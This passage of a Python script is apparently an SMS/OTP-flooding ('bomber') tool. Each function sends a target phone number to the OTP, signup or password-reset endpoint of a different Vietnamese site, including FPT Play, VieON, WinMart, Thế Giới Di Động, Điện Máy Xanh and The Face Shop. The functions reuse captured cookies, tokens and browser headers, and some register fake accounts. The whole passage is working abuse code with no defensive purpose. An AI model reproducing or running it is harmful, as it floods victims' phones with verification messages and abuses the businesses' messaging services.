        'X-XSRF-TOKEN': 'eyJpdiI6Ii9RMTQrNk9RREZvWXF6UkdnTzM5M1E9PSIsInZhbHVlIjoiWmkzTHExeU1tNmFSM1ltczdpWU1Ec1hCZTROSXhzTEJVRDE2NXQ2NmVTR3lMQ1paS3NBSitwRllzVVNUUFB6WG1YNXdXSEJuOE1VZjQ4ZzE2WnBYUFRYVGFNT2NSTUhNYk1tWkhVdTZRa0gyRFVOM2g1WWdOeVFIWUxCMVY0Y2kiLCJtYWMiOiJhMzA4YWEyZTk5ZGEzZmY3ZTZiMTFjMTNhYTk4NzYyZjkxYTAyOWQyNDcyYTIxMGU2NDQ5MjVmNzc5ODgwZmUyIiwidGFnIjoiIn0=',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'mobile': sdt,
        'mobile_country_prefix': '84',
    }

    try:
        response = requests.post('https://medicare.vn/api/otp', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MEDICARE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MEDICARE | TRẠNG THÁI : THẤT BẠI")

def tokyolife():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://tokyolife.vn',
        'priority': 'u=1, i',
        'referer': 'https://tokyolife.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'signature': '260a5bdf2a783bc889dcf22852ff0c5e',
        'timestamp': '1721494339686',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone_number': sdt,
        'name': 'tran th1nk',
        'password': '123123123a',
        'email': 'ret43ht6@gmail.com',
        'birthday': '2003-10-01',
        'gender': 'male',
    }

    try:
        response = requests.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TOKYOLIFE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TOKYOLIFE | TRẠNG THÁI : THẤT BẠI")

def vieon():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjE2OTc2NzcsImp0aSI6IjM2YTYxOGU4ZmNlMzlmNzVkZjJhZDk1Mjg5YWE3OTk5IiwiYXVkIjoiIiwiaWF0IjoxNzIxNTI0ODc3LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTcyMTUyNDg3Niwic3ViIjoiYW5vbnltb3VzXzI1MjhiYWQ3MWJiYmY5ODg4ODJhYTcyZmRiMTA1Mzg0LWNlM2FjYzc2ODdlNmVjNWRhZGJiN2E1N2YzMWE0YTBkLTE3MjE1MjQ4NzciLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiMjUyOGJhZDcxYmJiZjk4ODg4MmFhNzJmZGIxMDUzODQtY2UzYWNjNzY4N2U2ZWM1ZGFkYmI3YTU3ZjMxYTRhMGQtMTcyMTUyNDg3NyIsInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNi4wLjAuMCBTYWZhcmkvNTM3LjM2IE9QUi8xMTIuMC4wLjAiLCJkdCI6IndlYiIsIm10aCI6ImFub255bW91c19sb2dpbiIsIm1kIjoiV2luZG93cyAxMCIsImlzcHJlIjowLCJ2ZXJzaW9uIjoiIn0.wXtslFrAOKsPxT41wnkXvzY7K1AocvJykB4eI0jnesY',
        'content-type': 'application/json',
        'origin': 'https://vieon.vn',
        'priority': 'u=1, i',
        'referer': 'https://vieon.vn/auth/?destination=/&page=/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'platform': 'web',
        'ui': '012021',
    }

    json_data = {
        'username': sdt,
        'country_code': 'VN',
        'model': 'Windows 10',
        'device_id': '2528bad71bbbf988882aa72fdb105384',
        'device_name': 'Opera/112',
        'device_type': 'desktop',
        'platform': 'web',
        'ui': '012021',
    }

    try:
        response = requests.post('https://api.vieon.vn/backend/user/v2/register', params=params, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIEON | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIEON | TRẠNG THÁI : THẤT BẠI")

def fptreg():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://fptplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://fptplay.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-did': 'B274C650E1693D1F',
    }

    json_data = {
        'phone': sdt,
        'country_code': 'VN',
        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
    }

    try:
        response = requests.post(
            'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=EtZ0F4nqKi0D0l5lvM5Vlw&e=1721529198&device=Opera(version%253A112.0.0.0)&drm=1',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FPTREG | TRẠNG THÁI : THÀNH CÔNG");print(response.text)
    except requests.exceptions.RequestException:
        print("FPTREG | TRẠNG THÁI : THẤT BẠI")

def fptreset():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://fptplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://fptplay.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-did': 'B274C650E1693D1F',
    }

    json_data = {
        'phone': sdt,
        'country_code': 'VN',
        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
    }

    try:
        response = requests.post(
            'https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp?st=Mp8U7wZGJe0SNpw7eyiZ4g&e=1721529690&device=Opera(version%253A112.0.0.0)&drm=1',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FPTRESET | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FPTRESET | TRẠNG THÁI : THẤT BẠI")

def fptresend():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://fptplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://fptplay.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-did': 'B274C650E1693D1F',
    }

    json_data = {
        'phone': sdt,
        'email': '',
        'country_code': 'VN',
        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
    }

    try:
        response = requests.post(
            'https://api.fptplay.net/api/v7.1_w/user/otp/resend_otp?st=q-xLREdlNXduE2Bt-ILubw&e=1721530087&device=Opera(version%253A112.0.0.0)&drm=1',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FPTRESEND | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FPTRESEND | TRẠNG THÁI : THẤT BẠI")

def winmart():
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'origin': 'https://winmart.vn',
        'priority': 'u=1, i',
        'referer': 'https://winmart.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-api-merchant': 'WCM',
    }

    json_data = {
        'firstName': 'tran tranh',
        'phoneNumber': sdt,
        'masanReferralCode': '',
        'dobDate': '1996-07-12',
        'gender': 'Male',
    }

    try:
        response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("WINMART | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("WINMART | TRẠNG THÁI : THẤT BẠI")

def tgdidong():
    cookies = {
        '_ga': 'GA1.1.383137769.1707219496',
        '_pk_id.7.8f7e': '98ddc5d43340bec9.1707219498.',
        '_tt_enable_cookie': '1',
        '_ttp': 'lc7jJkDQUTphqZNKGUgbp4UXsVT',
        'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D',
        '_gcl_au': '1.1.1960895612.1715007168',
        '_ce.s': 'v~06f7993d465cd9643255ae47331c104ea2a8f43f~lcw~1716365214445~lva~1710611539005~vpv~2~v11.cs~127806~v11.s~5e8eeb30-1811-11ef-9635-b97827c5d2c2~v11.send~1716364882755~v11.sla~1716365214560~lcw~1716365214560',
        '___utmvm': '###########',
        'ASP.NET_SessionId': 'kkussnf30znrftqduwbdzoaz',
        '_fbp': 'fb.1.1719755336237.751784073551657802',
        '_pk_ref.7.8f7e': '%5B%22%22%2C%22%22%2C1719755337%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
        '__zi': '3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJcp-VghMOJncQFv-ejTT96fbqdw-yqKqSc30n.1',
        '_ga_TLRZMSX5ME': 'GS1.1.1719755335.46.1.1719755823.59.0.0',
        '__RequestVerificationToken_L2dhbWUtYXBw0': 'rzKrwattPlE5aIeSUH_Ba4w259rIIze-LaaclUjNHcNQCji0VgT0zNQ7Zq8cFI4eQk0jHQnWOf7y7onaJEjp-wPVuKs1',
        'TBMCookie_3209819802479625248': '704213001721527337Hu28LknIyBN3jECb5nTjLkwFuDU=',
        '.AspNetCore.Antiforgery.Pr58635MgNE': 'CfDJ8AFHr2lS7PNCsmzvEMPceBNpSdfUfuzn0Tk0qaOME94sn78vfGeyjelReu51zW1TBbsCoJH4dKRyyvQ7UzcC3wV8QVT81_RgQqGnWVsuuUDAD2OMWHK_g60DtIbnThCaeFM0aJqujknPABfHc5N4BS8',
        'SvID': 'beline2682|Zpxsx|ZpxsL',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': '_ga=GA1.1.383137769.1707219496; _pk_id.7.8f7e=98ddc5d43340bec9.1707219498.; _tt_enable_cookie=1; _ttp=lc7jJkDQUTphqZNKGUgbp4UXsVT; DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D; _gcl_au=1.1.1960895612.1715007168; _ce.s=v~06f7993d465cd9643255ae47331c104ea2a8f43f~lcw~1716365214445~lva~1710611539005~vpv~2~v11.cs~127806~v11.s~5e8eeb30-1811-11ef-9635-b97827c5d2c2~v11.send~1716364882755~v11.sla~1716365214560~lcw~1716365214560; ___utmvm=###########; ASP.NET_SessionId=kkussnf30znrftqduwbdzoaz; _fbp=fb.1.1719755336237.751784073551657802; _pk_ref.7.8f7e=%5B%22%22%2C%22%22%2C1719755337%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; __zi=3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJcp-VghMOJncQFv-ejTT96fbqdw-yqKqSc30n.1; _ga_TLRZMSX5ME=GS1.1.1719755335.46.1.1719755823.59.0.0; __RequestVerificationToken_L2dhbWUtYXBw0=rzKrwattPlE5aIeSUH_Ba4w259rIIze-LaaclUjNHcNQCji0VgT0zNQ7Zq8cFI4eQk0jHQnWOf7y7onaJEjp-wPVuKs1; TBMCookie_3209819802479625248=704213001721527337Hu28LknIyBN3jECb5nTjLkwFuDU=; .AspNetCore.Antiforgery.Pr58635MgNE=CfDJ8AFHr2lS7PNCsmzvEMPceBNpSdfUfuzn0Tk0qaOME94sn78vfGeyjelReu51zW1TBbsCoJH4dKRyyvQ7UzcC3wV8QVT81_RgQqGnWVsuuUDAD2OMWHK_g60DtIbnThCaeFM0aJqujknPABfHc5N4BS8; SvID=beline2682|Zpxsx|ZpxsL',
        'Origin': 'https://www.thegioididong.com',
        'Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phoneNumber': sdt,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8AFHr2lS7PNCsmzvEMPceBNmcyxqfG4iox8M-NAgV5Q8ffXIQLpqWRkUg7FNMCcXbDGttXTUOUmdIpQ_KvOdMghelaFFw19tC0tdNruWUKkJSdyIXgff-CzqyfSx-6wOmYxTRqCMnxQsHfxdy9qova8',
    }

    try:
        response = requests.post(
            'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TGDIDONG | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TGDIDONG | TRẠNG THÁI : THẤT BẠI")

def dienmayxanh():
    cookies = {
        '_ga': 'GA1.1.939547831.1707797103',
        '_pk_id.8.8977': 'e802b602f6107cf3.1707797103.',
        '__zi': '3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXareFm7kFkUlPMm_0UO_sxTfOHC1-Xl3ft5b5n0.1',
        '_pk_ref.8.8977': '%5B%22%22%2C%22%22%2C1715006306%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
        '_ga_Y7SWKJEHCE': 'GS1.1.1715006306.6.1.1715006470.35.0.0',
        '_ce.s': 'v~ff26ccac15be51f1102509bcedf9db29bdf23777~lcw~1715006470671~lva~1711640411478~vpv~1~v11.cs~218102~v11.s~4d054880-0bb6-11ef-bfef-dd812afaeae2~v11.sla~1715006470671~gtrk.la~lvv2klxr~v11.send~1715006470666~lcw~1715006470672',
        'DMX_View': 'DESKTOP',
        'DMX_Personal': '%7b%22UID%22%3anull%2c%22ProvinceId%22%3a3%2c%22Culture%22%3a%22vi-3%22%2c%22Lat%22%3a0.0%2c%22Lng%22%3a0.0%2c%22DistrictId%22%3a0%2c%22WardId%22%3a0%2c%22CRMCustomerId%22%3anull%2c%22CustomerSex%22%3a-1%2c%22CustomerName%22%3anull%2c%22CustomerPhone%22%3anull%2c%22CustomerEmail%22%3anull%2c%22CustomerIdentity%22%3anull%2c%22CustomerBirthday%22%3anull%2c%22CustomerAddress%22%3anull%2c%22IsDefault%22%3afalse%7d',
        '___utmvm': '###########',
        'TBMCookie_3209819802479625248': '776601001721528393bXxgBsRABGmtGgaJgAFdbO3dR0A=',
        '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dtrue,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
        'SvID': 'new2693|ZpxwU|ZpxwT',
        '.AspNetCore.Antiforgery.SuBGfRYNAsQ': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5TlW1yu94AbLY9Foj1ATcGLAtFG438KORcw1uifchTktISZlzc3jkSEVDilhPCQZ77srpJ8LiRF_P_Jijxc7NssGtaQvcZNo5shOUPZKGaElFMjm9rBI6-cQGKiaSv1aSU',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': "_ga=GA1.1.939547831.1707797103; _pk_id.8.8977=e802b602f6107cf3.1707797103.; __zi=3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXareFm7kFkUlPMm_0UO_sxTfOHC1-Xl3ft5b5n0.1; _pk_ref.8.8977=%5B%22%22%2C%22%22%2C1715006306%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _ga_Y7SWKJEHCE=GS1.1.1715006306.6.1.1715006470.35.0.0; _ce.s=v~ff26ccac15be51f1102509bcedf9db29bdf23777~lcw~1715006470671~lva~1711640411478~vpv~1~v11.cs~218102~v11.s~4d054880-0bb6-11ef-bfef-dd812afaeae2~v11.sla~1715006470671~gtrk.la~lvv2klxr~v11.send~1715006470666~lcw~1715006470672; DMX_View=DESKTOP; DMX_Personal=%7b%22UID%22%3anull%2c%22ProvinceId%22%3a3%2c%22Culture%22%3a%22vi-3%22%2c%22Lat%22%3a0.0%2c%22Lng%22%3a0.0%2c%22DistrictId%22%3a0%2c%22WardId%22%3a0%2c%22CRMCustomerId%22%3anull%2c%22CustomerSex%22%3a-1%2c%22CustomerName%22%3anull%2c%22CustomerPhone%22%3anull%2c%22CustomerEmail%22%3anull%2c%22CustomerIdentity%22%3anull%2c%22CustomerBirthday%22%3anull%2c%22CustomerAddress%22%3anull%2c%22IsDefault%22%3afalse%7d; ___utmvm=###########; TBMCookie_3209819802479625248=776601001721528393bXxgBsRABGmtGgaJgAFdbO3dR0A=; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dtrue,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; SvID=new2693|ZpxwU|ZpxwT; .AspNetCore.Antiforgery.SuBGfRYNAsQ=CfDJ8LmkDaXB2QlCm0k7EtaCd5TlW1yu94AbLY9Foj1ATcGLAtFG438KORcw1uifchTktISZlzc3jkSEVDilhPCQZ77srpJ8LiRF_P_Jijxc7NssGtaQvcZNo5shOUPZKGaElFMjm9rBI6-cQGKiaSv1aSU",
        'Origin': 'https://www.dienmayxanh.com',
        'Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phoneNumber': sdt,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5TT5ZU_rJVhy8x3F_L2DiqjDc1L_VRbJiGtF6nRoVvDLPby5ttmADmlIwjASFbRoQXmnFIpyCwkWErImoHvqHc6D1Vb9shU3Z3n67mDZCKqSmU5PWGqoH6wMh-UqswE9EQ',
    }

    try:
        response = requests.post(
            'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("DIENMAYXANH | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("DIENMAYXANH | TRẠNG THÁI : THẤT BẠI")

def meta():
    cookies = {
        '_ssid': 'kfeiac30ctlo2jkxrl4b2gls',
        '__ckref': 'performance-sale',
        '_cart_': '0ea51858-1f80-4165-8840-74939d5e3d75',
        '__ckmid': '0e43463633164e028245b4bf873328d6',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': '_ssid=kfeiac30ctlo2jkxrl4b2gls; __ckref=performance-sale; _cart_=0ea51858-1f80-4165-8840-74939d5e3d75; __ckmid=0e43463633164e028245b4bf873328d6',
        'origin': 'https://meta.vn',
        'priority': 'u=1, i',
        'referer': 'https://meta.vn/account/register?ReturnUrl=/account/history',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'api_mode': '1',
    }

    json_data = {
        'api_args': {
            'lgUser': sdt,
            'type': 'phone',
        },
        'api_method': 'CheckRegister',
    }

    try:
        response = requests.post(
            'https://meta.vn/app_scripts/pages/AccountReact.aspx',
            params=params,
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("META | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("META | TRẠNG THÁI : THẤT BẠI")

def thefaceshop():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'key': 'cf709515be3685bb734f1c6bcb30bffc',
        'origin': 'https://thefaceshop.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://thefaceshop.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1721530092656',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.post(
            'https://tfs-api.hsv-tech.io/client/phone-verification/request-verification',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("THEFACESHOP | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("THEFACESHOP | TRẠNG THÁI : THẤT BẠI")

def bestexpress():
    headers = {
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Origin': 'https://best-inc.vn',
        'Referer': 'https://best-inc.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'accept': 'application/json',
        'authorization': 'null',
        'content-type': 'application/json',
        'lang-type': 'vi-VN',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'x-auth-type': 'WEB',
        'x-lan': 'VI',
